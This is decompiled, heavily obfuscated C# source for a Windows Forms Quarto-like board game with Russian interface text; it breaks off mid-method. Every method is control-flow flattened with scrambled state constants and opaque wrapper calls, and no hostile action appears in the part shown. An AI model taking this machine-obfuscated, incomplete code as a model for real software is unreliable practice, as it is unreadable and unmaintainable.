using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Cytotechnologist;

public class Form1 : Form
{
	public class Figurine
	{
		public bool Dark;

		public bool Big;

		public bool Square;

		public bool Point;

		public Figurine(bool dark, bool big, bool square, bool point)
		{
			Dark = dark;
			Big = big;
			Square = square;
			Point = point;
		}

		public Figurine(Figurine copy)
		{
			Dark = copy.Dark;
			Big = copy.Big;
			Square = copy.Square;
			Point = copy.Point;
		}
	}

	private Form menu;

	private Random rnd = Form1.smethod_0();

	private Figurine[,] storage;

	private Figurine[,] board;

	private readonly int size = 60;

	public bool turn;

	private DateTime time;

	private int step;

	private PictureBox[,] pictureBox;

	private PictureBox[,] borderBox;

	private IContainer components = null;

	private static Type ComMember;

	private PictureBox pictureBox1;

	private Button button2;

	private Button button1;

	private RichTextBox richTextBox1;

	private Panel panel1;

	private Label label1;

	private Label label2;

	private Label label5;

	private Label label6;

	public Timer timer1;

	public Form1()
	{
		//IL_016e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0178: Expected O, but got Unknown
		int num4 = default(int);
		bool flag = default(bool);
		bool flag2 = default(bool);
		int num3 = default(int);
		double num8 = default(double);
		while (true)
		{
			int num = -1306810584;
			while (true)
			{
				uint num2;
				double num7;
				switch ((num2 = (uint)num ^ 0x9FCB2D0Cu) % 27u)
				{
				case 26u:
				{
					Form3 form_ = new Form3();
					Form1.smethod_10((Form)(object)form_, (Form)(object)this);
					menu = (Form)(object)form_;
					num = (int)(num2 * 1846382672) ^ -1533085151;
					continue;
				}
				case 25u:
					num4 = 0;
					num = -80945796;
					continue;
				case 24u:
					num = (int)(num2 * 1736857834) ^ -1438197556;
					continue;
				case 22u:
					num = (int)(num2 * 1535401537) ^ -825945739;
					continue;
				case 21u:
					num4++;
					num = ((int)num2 * -102766141) ^ 0xAAAB222;
					continue;
				case 20u:
					flag = num4 < 4;
					num = -294766037;
					continue;
				case 19u:
				{
					int num13;
					int num14;
					if (flag2)
					{
						num13 = 279261593;
						num14 = 279261593;
					}
					else
					{
						num13 = 1815847767;
						num14 = 1815847767;
					}
					num = num13 ^ ((int)num2 * -1510762017);
					continue;
				}
				case 18u:
					borderBox = new PictureBox[4, 4];
					num = ((int)num2 * -1437734141) ^ -2007009096;
					continue;
				case 17u:
					num = (int)(num2 * 1594362860) ^ -1494460275;
					continue;
				case 16u:
				{
					PictureBox[,] array2 = pictureBox;
					int num11 = num3;
					int num12 = num4;
					PictureBox obj2 = Form1.smethod_2();
					Form1.smethod_3((Control)(object)obj2, new Size(size - 8, size - 8));
					Form1.smethod_4((Control)(object)obj2, new Point(4 + (int)(((double)num4 + num8) * (double)size), 4 + num3 * size));
					Form1.smethod_5((Control)(object)obj2, Color.White);
					array2[num11, num12] = obj2;
					Form1.smethod_6((Control)(object)pictureBox[num3, num4], new MouseEventHandler(PictureBoxIJ_MouseDown));
					num = ((int)num2 * -1343821661) ^ 0x86C066E;
					continue;
				}
				case 15u:
					num3 = 0;
					num = ((int)num2 * -1199944809) ^ -879369985;
					continue;
				case 14u:
					Form1.smethod_11((Control)(object)menu);
					num = ((int)num2 * -2091514329) ^ -1773403950;
					continue;
				case 13u:
					flag2 = num3 < 4;
					num = -354459280;
					continue;
				case 12u:
					num = (int)(num2 * 1512396845) ^ -830235595;
					continue;
				case 11u:
				{
					PictureBox[,] array = borderBox;
					int num9 = num3;
					int num10 = num4;
					PictureBox obj = Form1.smethod_2();
					Form1.smethod_3((Control)(object)obj, new Size(size - 2, size - 2));
					Form1.smethod_4((Control)(object)obj, new Point(1 + (int)(((double)num4 + num8) * (double)size), 1 + num3 * size));
					Form1.smethod_7((Control)(object)obj, bool_0: false);
					array[num9, num10] = obj;
					Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)pictureBox[num3, num4]);
					num = (int)(num2 * 820597582) ^ -1618402027;
					continue;
				}
				case 10u:
					num = ((int)num2 * -192116881) ^ 0x23E96153;
					continue;
				case 9u:
					InitializeComponent();
					num = (int)(num2 * 1891827535) ^ -754249276;
					continue;
				case 8u:
					num = (int)((num2 * 167699318) ^ 0x6C241C11);
					continue;
				case 6u:
					if (num4 >= 2)
					{
						num = -559984003;
						continue;
					}
					num7 = 0.0;
					goto IL_02bf;
				case 5u:
					num7 = 4.1;
					goto IL_02bf;
				case 4u:
				{
					int num5;
					int num6;
					if (flag)
					{
						num5 = 1276596143;
						num6 = 1276596143;
					}
					else
					{
						num5 = 340791215;
						num6 = 340791215;
					}
					num = num5 ^ ((int)num2 * -1067284548);
					continue;
				}
				case 3u:
					num = (int)(num2 * 1809508184) ^ -34550990;
					continue;
				case 2u:
					num3++;
					num = (int)((num2 * 1611425742) ^ 0xD087360);
					continue;
				case 1u:
					Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)borderBox[num3, num4]);
					num = (int)((num2 * 2136507819) ^ 0x29CE8C01);
					continue;
				case 0u:
					Form1.smethod_1(richTextBox1, (HorizontalAlignment)2);
					pictureBox = new PictureBox[4, 4];
					num = (int)((num2 * 10405933) ^ 0x8D62F03);
					continue;
				default:
					return;
				case 7u:
					break;
				case 23u:
					return;
					IL_02bf:
					num8 = num7;
					num = -779360798;
					continue;
				}
				break;
			}
		}
	}

	private void Form1_LocationChanged(object sender, EventArgs e)
	{
		Form1.smethod_13(menu, new Point(Form1.smethod_12((Form)(object)this).X + 8, Form1.smethod_12((Form)(object)this).Y + 51));
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		Form1.smethod_14(menu);
	}

	public void Button1_Click(object sender, EventArgs e)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = 867239282;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x56A9D2C1u) % 10u)
				{
				case 9u:
					Form1.smethod_15(timer1);
					num = (int)((num2 * 737109203) ^ 0x487EF4AD);
					continue;
				case 8u:
					num = (int)((num2 * 4041167) ^ 0x184FB77C);
					continue;
				case 7u:
					num = ((int)num2 * -1628488219) ^ 0x26135AFB;
					continue;
				case 6u:
				{
					Form control_ = menu;
					Form1.smethod_17((Control)(object)control_, Form1.smethod_16((Control)(object)control_) + 5);
					num = (int)((num2 * 523553328) ^ 0xB9B31C3);
					continue;
				}
				case 4u:
					num = 2012124685;
					continue;
				case 3u:
					flag = Form1.smethod_16((Control)(object)menu) < 296;
					num = 2051533809;
					continue;
				case 2u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = 1788141829;
						num4 = 1788141829;
					}
					else
					{
						num3 = 1710942037;
						num4 = 1710942037;
					}
					num = num3 ^ (int)(num2 * 8435163);
					continue;
				}
				case 0u:
					Form1.smethod_14(menu);
					num = (int)(num2 * 1094669086) ^ -287862024;
					continue;
				default:
					return;
				case 5u:
					break;
				case 1u:
					return;
				}
				break;
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		int num3 = default(int);
		int num5 = default(int);
		while (true)
		{
			int num = 1431789537;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x46F42B64u) % 19u)
				{
				case 18u:
					num = ((int)num2 * -1926715085) ^ 0x26771450;
					continue;
				case 17u:
					Paint_Board();
					num = ((int)num2 * -1004827608) ^ -144815467;
					continue;
				case 16u:
					board = new Figurine[4, 4];
					storage = new Figurine[4, 4];
					num3 = 0;
					num = (int)((num2 * 733750618) ^ 0x4839DB0B);
					continue;
				case 15u:
					storage[num3, num5] = new Figurine(num3 < 2, num5 % 2 == 0, num5 < 2, num3 % 2 == 1);
					num = (int)(num2 * 570051059) ^ -1061052575;
					continue;
				case 14u:
					Form1.smethod_5((Control)(object)borderBox[num3, num5], Color.White);
					Form1.smethod_7((Control)(object)pictureBox[num3, num5], bool_0: false);
					num = ((int)num2 * -1089057895) ^ -867033774;
					continue;
				case 12u:
					num3++;
					num = (int)((num2 * 1151241660) ^ 0x33D2B7CB);
					continue;
				case 11u:
					num = 1864951666;
					continue;
				case 10u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = (int)(num2 * 804421173) ^ -1258107171;
					continue;
				case 9u:
					Paint_Storage();
					num = (int)((num2 * 1711561389) ^ 0x7FE494B9);
					continue;
				case 8u:
				{
					int num6;
					if (num5 >= 4)
					{
						num = 2007045969;
						num6 = 2007045969;
					}
					else
					{
						num = 186942141;
						num6 = 186942141;
					}
					continue;
				}
				case 6u:
					num = ((int)num2 * -883276324) ^ 0x5281EF3A;
					continue;
				case 5u:
					num5++;
					num = ((int)num2 * -431422459) ^ 0x669C5931;
					continue;
				case 4u:
					num5 = 0;
					num = 1292570924;
					continue;
				case 3u:
					num = ((int)num2 * -1399301060) ^ 0x3E5EEA5B;
					continue;
				case 2u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = (int)((num2 * 1288926549) ^ 0x1A691CEF);
					continue;
				case 1u:
				{
					int num4;
					if (num3 >= 4)
					{
						num = 1994831436;
						num4 = 1994831436;
					}
					else
					{
						num = 1179198357;
						num4 = 1179198357;
					}
					continue;
				}
				case 0u:
					num = ((int)num2 * -950907206) ^ -284408776;
					continue;
				default:
					return;
				case 7u:
					break;
				case 13u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Board()
	{
		Graphics graphics_ = default(Graphics);
		int num5 = default(int);
		bool flag = default(bool);
		bool flag2 = default(bool);
		int num7 = default(int);
		Brush brush_ = default(Brush);
		float num14 = default(float);
		float num6 = default(float);
		float num15 = default(float);
		float num8 = default(float);
		float num11 = default(float);
		bool flag3 = default(bool);
		bool square = default(bool);
		bool dark = default(bool);
		bool big = default(bool);
		while (true)
		{
			int num = 1973158887;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x5DB31456u) % 46u)
				{
				case 45u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = (int)((num2 * 69106179) ^ 0x70BA5A34);
					continue;
				case 43u:
					num5++;
					num = (int)(num2 * 1441841196) ^ -300743323;
					continue;
				case 42u:
				{
					int num18;
					int num19;
					if (flag)
					{
						num18 = 371836384;
						num19 = 371836384;
					}
					else
					{
						num18 = 1919315957;
						num19 = 1919315957;
					}
					num = num18 ^ (int)(num2 * 2107549771);
					continue;
				}
				case 41u:
					flag2 = board[num7, num5] != null;
					num = (int)((num2 * 1344871773) ^ 0x1C5A45D0);
					continue;
				case 40u:
					brush_ = Form1.smethod_25();
					num = ((int)num2 * -283092206) ^ 0x25DC12D3;
					continue;
				case 39u:
					num = (int)(num2 * 370835067) ^ -377684184;
					continue;
				case 38u:
					num = ((int)num2 * -1900520266) ^ 0x4ED9489;
					continue;
				case 37u:
					num = (int)((num2 * 902749412) ^ 0x1D7AA07E);
					continue;
				case 36u:
					num = 1778126990;
					continue;
				case 35u:
					num14 = 1f;
					num = ((int)num2 * -1883021909) ^ 0x781F6DF9;
					continue;
				case 34u:
					num6 = (float)size * (num15 / 2f);
					num = ((int)num2 * -453922267) ^ 0x31FAC2EF;
					continue;
				case 33u:
				{
					num8 = num11 * 0.4f / (float)Form1.smethod_27(2.0);
					int num12;
					int num13;
					if (board[num7, num5].Point)
					{
						num12 = 301452693;
						num13 = 301452693;
					}
					else
					{
						num12 = 827360339;
						num13 = 827360339;
					}
					num = num12 ^ ((int)num2 * -1943755199);
					continue;
				}
				case 32u:
					Form1.smethod_24(graphics_, brush_, num6 + (float)(num5 * size), num6 + (float)(num7 * size), num8, num8);
					num = 1761231413;
					continue;
				case 31u:
					flag = num5 < 4;
					num = 1804734294;
					continue;
				case 30u:
					num = 1165204790;
					continue;
				case 29u:
					num8 = num11 * 0.9f / (float)Form1.smethod_27(2.0);
					num = ((int)num2 * -1093455485) ^ 0x7F72C211;
					continue;
				case 28u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)(num2 * 536612094) ^ -230449870;
					continue;
				case 27u:
					num7 = 0;
					num = (int)((num2 * 1543519665) ^ 0x7D8A2B40);
					continue;
				case 26u:
					num = ((int)num2 * -1248543550) ^ 0x7AAFF6F0;
					continue;
				case 25u:
					num = (int)(num2 * 1428710163) ^ -767490821;
					continue;
				case 24u:
				{
					int num22;
					int num23;
					if (flag3)
					{
						num22 = -946614175;
						num23 = -946614175;
					}
					else
					{
						num22 = -553738888;
						num23 = -553738888;
					}
					num = num22 ^ (int)(num2 * 879069021);
					continue;
				}
				case 23u:
					Form1.smethod_28(graphics_, brush_, num6 + (float)(num5 * size), num6 + (float)(num7 * size), num8, num8);
					num = ((int)num2 * -1746197338) ^ -1334853885;
					continue;
				case 22u:
					num = (int)(num2 * 574454442) ^ -987397427;
					continue;
				case 21u:
					num15 = 1f - num14 * 0.9f / (float)Form1.smethod_27(2.0);
					num = 1123817784;
					continue;
				case 20u:
					num = 676659239;
					continue;
				case 19u:
					num = (int)(num2 * 1289151875) ^ -1721394441;
					continue;
				case 18u:
					num11 = (float)size * num14;
					num = ((int)num2 * -326119666) ^ -739759734;
					continue;
				case 17u:
					num5 = 0;
					num = 1875068425;
					continue;
				case 16u:
					square = board[num7, num5].Square;
					num = ((int)num2 * -2120391037) ^ -1700818794;
					continue;
				case 15u:
					num7++;
					num = (int)((num2 * 727035712) ^ 0x7037BAA3);
					continue;
				case 14u:
				{
					int num20;
					int num21;
					if (dark)
					{
						num20 = -26586370;
						num21 = -26586370;
					}
					else
					{
						num20 = -1833403935;
						num21 = -1833403935;
					}
					num = num20 ^ ((int)num2 * -255036179);
					continue;
				}
				case 13u:
					brush_ = Form1.smethod_26();
					num = 1752534970;
					continue;
				case 12u:
					num14 = 0.7f;
					num = 390261097;
					continue;
				case 11u:
					flag3 = num7 < 4;
					num = 1800691154;
					continue;
				case 10u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num6 + (float)(num5 * size), num6 + (float)(num7 * size), num8, num8);
					num = ((int)num2 * -554944108) ^ 0x52521C77;
					continue;
				case 9u:
				{
					int num16;
					int num17;
					if (!big)
					{
						num16 = 865260854;
						num17 = 865260854;
					}
					else
					{
						num16 = 225976889;
						num17 = 225976889;
					}
					num = num16 ^ ((int)num2 * -520834918);
					continue;
				}
				case 8u:
					Form1.smethod_24(graphics_, Form1.smethod_23(), ((float)num5 + 0.05f) * (float)size, ((float)num7 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -1809024263) ^ -640886235;
					continue;
				case 7u:
					num15 = 1f - num14 * 0.4f / (float)Form1.smethod_27(2.0);
					num6 = (float)size * (num15 / 2f);
					num = 562858401;
					continue;
				case 5u:
				{
					int num9;
					int num10;
					if (flag2)
					{
						num9 = -1744797647;
						num10 = -1744797647;
					}
					else
					{
						num9 = -2136682521;
						num10 = -2136682521;
					}
					num = num9 ^ (int)(num2 * 2120699913);
					continue;
				}
				case 4u:
					big = board[num7, num5].Big;
					num = 817435899;
					continue;
				case 3u:
					dark = board[num7, num5].Dark;
					num = (int)((num2 * 2101793824) ^ 0x3DFD908);
					continue;
				case 2u:
				{
					int num3;
					int num4;
					if (!square)
					{
						num3 = 1935563190;
						num4 = 1935563190;
					}
					else
					{
						num3 = 1155722631;
						num4 = 1155722631;
					}
					num = num3 ^ (int)(num2 * 1814828373);
					continue;
				}
				case 1u:
					Form1.smethod_20(pictureBox1, (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox1), Form1.smethod_16((Control)(object)pictureBox1)));
					num = (int)((num2 * 1455495523) ^ 0x1917A382);
					continue;
				case 0u:
					num = (int)((num2 * 1965392785) ^ 0x441ED929);
					continue;
				default:
					return;
				case 6u:
					break;
				case 44u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Storage()
	{
		float num4 = default(float);
		float num3 = default(float);
		bool flag = default(bool);
		int num14 = default(int);
		int num13 = default(int);
		Brush brush_ = default(Brush);
		bool flag2 = default(bool);
		float num6 = default(float);
		float num5 = default(float);
		bool point = default(bool);
		bool dark = default(bool);
		float num15 = default(float);
		Graphics graphics_ = default(Graphics);
		bool big = default(bool);
		while (true)
		{
			int num = -98084878;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x8945AEF5u) % 38u)
				{
				case 37u:
					num4 = (float)size * (num3 / 2f) - 4f;
					num = ((int)num2 * -966694826) ^ -1683910010;
					continue;
				case 36u:
					flag = storage[num14, num13] != null;
					num = -1633786933;
					continue;
				case 35u:
					brush_ = Form1.smethod_25();
					num = ((int)num2 * -487530926) ^ -1231084844;
					continue;
				case 34u:
					num = (int)(num2 * 692795834) ^ -1933790454;
					continue;
				case 32u:
				{
					int num11;
					int num12;
					if (flag2)
					{
						num11 = 1384300045;
						num12 = 1384300045;
					}
					else
					{
						num11 = 1223055076;
						num12 = 1223055076;
					}
					num = num11 ^ ((int)num2 * -1191074027);
					continue;
				}
				case 31u:
					num6 = num5 * 0.4f / (float)Form1.smethod_27(2.0);
					num = ((int)num2 * -856111156) ^ -1331245585;
					continue;
				case 30u:
				{
					int num19;
					int num20;
					if (point)
					{
						num19 = -1537874397;
						num20 = -1537874397;
					}
					else
					{
						num19 = -1023820009;
						num20 = -1023820009;
					}
					num = num19 ^ (int)(num2 * 99528811);
					continue;
				}
				case 29u:
					brush_ = Form1.smethod_26();
					num = -794221240;
					continue;
				case 28u:
				{
					int num9;
					int num10;
					if (flag)
					{
						num9 = -1688478950;
						num10 = -1688478950;
					}
					else
					{
						num9 = -459604904;
						num10 = -459604904;
					}
					num = num9 ^ (int)(num2 * 2126409139);
					continue;
				}
				case 27u:
				{
					int num21;
					if (num14 < 4)
					{
						num = -2098270453;
						num21 = -2098270453;
					}
					else
					{
						num = -622976610;
						num21 = -622976610;
					}
					continue;
				}
				case 26u:
					num = (int)((num2 * 1956580610) ^ 0x6B92C281);
					continue;
				case 25u:
					flag2 = num13 < 2;
					num = ((int)num2 * -1762570323) ^ 0x195D3FFC;
					continue;
				case 23u:
					num = ((int)num2 * -390705228) ^ -1533115682;
					continue;
				case 22u:
				{
					int num17;
					int num18;
					if (!dark)
					{
						num17 = 1952792592;
						num18 = 1952792592;
					}
					else
					{
						num17 = 950266704;
						num18 = 950266704;
					}
					num = num17 ^ ((int)num2 * -1318102210);
					continue;
				}
				case 21u:
					num14++;
					num = ((int)num2 * -889999012) ^ -255773362;
					continue;
				case 20u:
					num15 = 0.7f;
					num = -341518758;
					continue;
				case 19u:
					num13++;
					num = -898301665;
					continue;
				case 18u:
					num = ((int)num2 * -433339613) ^ -1613525389;
					continue;
				case 17u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox[num14, num13]));
					num = (int)(num2 * 735084234) ^ -2020969029;
					continue;
				case 16u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num4, num4, num6, num6);
					num = ((int)num2 * -543050756) ^ -1715043939;
					continue;
				case 15u:
					Form1.smethod_20(pictureBox[num14, num13], (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox[num14, num13]), Form1.smethod_16((Control)(object)pictureBox[num14, num13])));
					num = ((int)num2 * -2015112702) ^ -1377193282;
					continue;
				case 14u:
					dark = storage[num14, num13].Dark;
					num = (int)(num2 * 285070753) ^ -1302029511;
					continue;
				case 13u:
					big = storage[num14, num13].Big;
					num = -247786532;
					continue;
				case 12u:
					point = storage[num14, num13].Point;
					num = ((int)num2 * -989784722) ^ 0x74B6048F;
					continue;
				case 11u:
					num15 = 1f;
					num = (int)(num2 * 416116825) ^ -98478165;
					continue;
				case 10u:
				{
					int num16;
					if (num13 >= 4)
					{
						num = -1336047424;
						num16 = -1336047424;
					}
					else
					{
						num = -1022859771;
						num16 = -1022859771;
					}
					continue;
				}
				case 9u:
					num14 = 0;
					num = ((int)num2 * -1864945562) ^ 0x20A7DD88;
					continue;
				case 8u:
					num3 = 1f - num15 * 0.4f / (float)Form1.smethod_27(2.0);
					num = -89253234;
					continue;
				case 7u:
					num3 = 1f - num15 * 0.9f / (float)Form1.smethod_27(2.0);
					num5 = (float)size * num15;
					num = -735443153;
					continue;
				case 6u:
					Form1.smethod_30((Control)(object)pictureBox[num14, num13]);
					num = -1386956301;
					continue;
				case 5u:
					Form1.smethod_24(graphics_, brush_, num4, num4, num6, num6);
					num = -201126671;
					continue;
				case 4u:
					num13 = 0;
					num = -898301665;
					continue;
				case 3u:
					num = ((int)num2 * -1886884693) ^ 0x64719041;
					continue;
				case 2u:
					Form1.smethod_28(graphics_, brush_, num4, num4, num6, num6);
					num = ((int)num2 * -897988803) ^ 0x701C4A6D;
					continue;
				case 1u:
				{
					int num7;
					int num8;
					if (!big)
					{
						num7 = -1838008591;
						num8 = -1838008591;
					}
					else
					{
						num7 = -2081857454;
						num8 = -2081857454;
					}
					num = num7 ^ (int)(num2 * 2103341012);
					continue;
				}
				case 0u:
					num4 = (float)size * (num3 / 2f) - 4f;
					num6 = num5 * 0.9f / (float)Form1.smethod_27(2.0);
					num = (int)((num2 * 1781634888) ^ 0x7745DBF0);
					continue;
				default:
					return;
				case 24u:
					break;
				case 33u:
					return;
				}
				break;
			}
		}
	}

	public void StartGame()
	{
		bool flag2 = default(bool);
		int num6 = default(int);
		int num3 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num = 827602193;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x4EE37A60u) % 24u)
				{
				case 23u:
					num = ((int)num2 * -1255674943) ^ 0x3E64B6E4;
					continue;
				case 22u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = 214349796;
					continue;
				case 21u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник выбрал фигуру. Выберете поле на доске для установки этой фигуры.");
					step = 1;
					num = (int)((num2 * 62429750) ^ 0x28C7D868);
					continue;
				case 20u:
					time = new DateTime(0L, DateTimeKind.Unspecified);
					num = (int)(num2 * 1691167393) ^ -1096875044;
					continue;
				case 19u:
					flag2 = turn;
					num = (int)(num2 * 1750890982) ^ -1712371726;
					continue;
				case 18u:
					num = ((int)num2 * -1586117249) ^ 0x6A95DA5B;
					continue;
				case 16u:
					Form1.smethod_35(timer1, bool_0: true);
					Form1.smethod_36(timer1);
					num = ((int)num2 * -395634172) ^ -19350191;
					continue;
				case 15u:
					num6++;
					num = (int)((num2 * 583662518) ^ 0x3557842B);
					continue;
				case 13u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ваш ход. Выберете фигуру, которой будет играть противник.");
					step = 0;
					num = (int)((num2 * 1547614780) ^ 0x52799640);
					continue;
				case 12u:
					num = (int)((num2 * 1707376695) ^ 0x6A84D6C2);
					continue;
				case 11u:
					Form1.smethod_7((Control)(object)pictureBox[num6, num3], bool_0: true);
					num3++;
					num = 1463344325;
					continue;
				case 10u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = ((int)num2 * -1677157478) ^ -2073081223;
					continue;
				case 9u:
				{
					int num11;
					if (num6 >= 4)
					{
						num = 423305125;
						num11 = 423305125;
					}
					else
					{
						num = 574144090;
						num11 = 574144090;
					}
					continue;
				}
				case 8u:
				{
					int num9;
					int num10;
					if (flag2)
					{
						num9 = -663140490;
						num10 = -663140490;
					}
					else
					{
						num9 = -64198805;
						num10 = -64198805;
					}
					num = num9 ^ ((int)num2 * -727947970);
					continue;
				}
				case 7u:
				{
					int num7;
					int num8;
					if (flag)
					{
						num7 = -1529360065;
						num8 = -1529360065;
					}
					else
					{
						num7 = -1934138405;
						num8 = -1934138405;
					}
					num = num7 ^ (int)(num2 * 1972826268);
					continue;
				}
				case 6u:
					num = (int)(num2 * 397472835) ^ -1641597522;
					continue;
				case 5u:
					flag = num3 < 4;
					num = 1814642791;
					continue;
				case 4u:
					num6 = 0;
					num = ((int)num2 * -1182544440) ^ -1873757832;
					continue;
				case 3u:
				{
					int num4 = Form1.smethod_33(rnd, 4);
					int num5 = Form1.smethod_33(rnd, 4);
					Form1.smethod_5((Control)(object)borderBox[num4, num5], Color.Blue);
					num = 1029349938;
					continue;
				}
				case 2u:
					num3 = 0;
					num = 779480578;
					continue;
				case 1u:
					Form1_Load(this, Form1.smethod_31());
					num = ((int)num2 * -487038639) ^ -1938187362;
					continue;
				case 0u:
					num = (int)((num2 * 579792814) ^ 0x193BF1);
					continue;
				default:
					return;
				case 14u:
					break;
				case 17u:
					return;
				}
				break;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		while (true)
		{
			int num = -1027600521;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xB7CD06A2u) % 3u)
				{
				case 1u:
					goto IL_0003;
				default:
					return;
				case 2u:
					break;
				case 0u:
					return;
				}
				break;
				IL_0003:
				time = time.AddSeconds(1.0);
				Form1.smethod_32((Control)(object)label1, Form1.smethod_34("Время: ", time.ToString("HH:mm:ss")));
				num = ((int)num2 * -197125206) ^ 0x92BD2CC;
			}
		}
	}

	private void PictureBoxIJ_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0089: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		Point point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
		int num9 = default(int);
		int num14 = default(int);
		int num8 = default(int);
		bool flag2 = default(bool);
		int num5 = default(int);
		bool flag = default(bool);
		bool flag3 = default(bool);
		while (true)
		{
			int num = -1537899963;
			while (true)
			{
				uint num2;
				int num15;
				switch ((num2 = (uint)num ^ 0xC240514Bu) % 26u)
				{
				case 25u:
					num9++;
					num = ((int)num2 * -1942656899) ^ -1074411440;
					continue;
				case 24u:
					num14 = point.Y / size;
					num = (int)((num2 * 1722704154) ^ 0x7DD95392);
					continue;
				case 23u:
				{
					int num12;
					int num13;
					if (num8 <= 1)
					{
						num12 = -1881159769;
						num13 = -1881159769;
					}
					else
					{
						num12 = -880027894;
						num13 = -880027894;
					}
					num = num12 ^ (int)(num2 * 2080063200);
					continue;
				}
				case 22u:
					num15 = ((Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox[num14, num8]), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0)) ? 1 : 0);
					goto IL_00ad;
				case 21u:
				{
					int num6;
					int num7;
					if (flag2)
					{
						num6 = 519137964;
						num7 = 519137964;
					}
					else
					{
						num6 = 315464312;
						num7 = 315464312;
					}
					num = num6 ^ ((int)num2 * -342534705);
					continue;
				}
				case 20u:
					num5++;
					num = ((int)num2 * -1488744813) ^ 0x6FA53E4E;
					continue;
				case 19u:
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num8 = point.X / size;
					num = ((int)num2 * -169338566) ^ 0x77ABFEB2;
					continue;
				case 18u:
					num9 = 0;
					num = -1105090204;
					continue;
				case 17u:
					num8 -= 4;
					num = (int)(num2 * 721837423) ^ -972084856;
					continue;
				case 16u:
					if (storage[num14, num8] != null)
					{
						num = -1304199975;
						continue;
					}
					num15 = 0;
					goto IL_00ad;
				case 14u:
					Form1.smethod_5((Control)(object)borderBox[num5, num9], Color.White);
					num = -517222066;
					continue;
				case 13u:
					Form1.smethod_5((Control)(object)borderBox[num14, num8], Color.Red);
					num = ((int)num2 * -849286211) ^ 0x265EB528;
					continue;
				case 11u:
					flag = num5 < 4;
					num = -315534752;
					continue;
				case 10u:
					num = ((int)num2 * -2017103992) ^ 0xB1224C5;
					continue;
				case 9u:
				{
					int num10;
					int num11;
					if (!flag3)
					{
						num10 = 1299403479;
						num11 = 1299403479;
					}
					else
					{
						num10 = 1011555995;
						num11 = 1011555995;
					}
					num = num10 ^ ((int)num2 * -1007631146);
					continue;
				}
				case 8u:
					flag3 = num9 < 4;
					num = -312300078;
					continue;
				case 7u:
					num = ((int)num2 * -361516978) ^ 0x7A73DA77;
					continue;
				case 6u:
					num = (int)((num2 * 1968366356) ^ 0x56822C00);
					continue;
				case 5u:
					num = (int)((num2 * 740241367) ^ 0x2CAA3A4F);
					continue;
				case 4u:
					num5 = 0;
					num = (int)(num2 * 472233288) ^ -2079256501;
					continue;
				case 3u:
					num = (int)(num2 * 3311074) ^ -635491595;
					continue;
				case 2u:
					num = ((int)num2 * -1094076958) ^ 0x58C512A7;
					continue;
				case 1u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = -1411850150;
						num4 = -1411850150;
					}
					else
					{
						num3 = -1093377861;
						num4 = -1093377861;
					}
					num = num3 ^ ((int)num2 * -1825345064);
					continue;
				}
				case 0u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					Form1.smethod_32((Control)(object)richTextBox1, "Именно эта фигура? Если да - нажмите \"Подтвердить\".");
					num = (int)(num2 * 1701918173) ^ -1507026704;
					continue;
				default:
					return;
				case 15u:
					break;
				case 12u:
					return;
					IL_00ad:
					flag2 = (byte)num15 != 0;
					num = -1751035736;
					continue;
				}
				break;
			}
		}
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ac: Expected O, but got Unknown
		int num = Form1.smethod_38(e) / size;
		int num5 = default(int);
		int num4 = default(int);
		bool flag3 = default(bool);
		Graphics graphics_ = default(Graphics);
		int num9 = default(int);
		bool flag = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num2 = 136525380;
			while (true)
			{
				uint num3;
				int num8;
				switch ((num3 = (uint)num2 ^ 0x37592466u) % 26u)
				{
				case 25u:
					num5++;
					num2 = ((int)num3 * -1467460276) ^ -2048029907;
					continue;
				case 24u:
					num4++;
					num2 = 1281922120;
					continue;
				case 23u:
					num2 = (int)((num3 * 1769200903) ^ 0x7D34EA42);
					continue;
				case 22u:
					num5 = 0;
					num2 = ((int)num3 * -1979926283) ^ 0x44F1E91D;
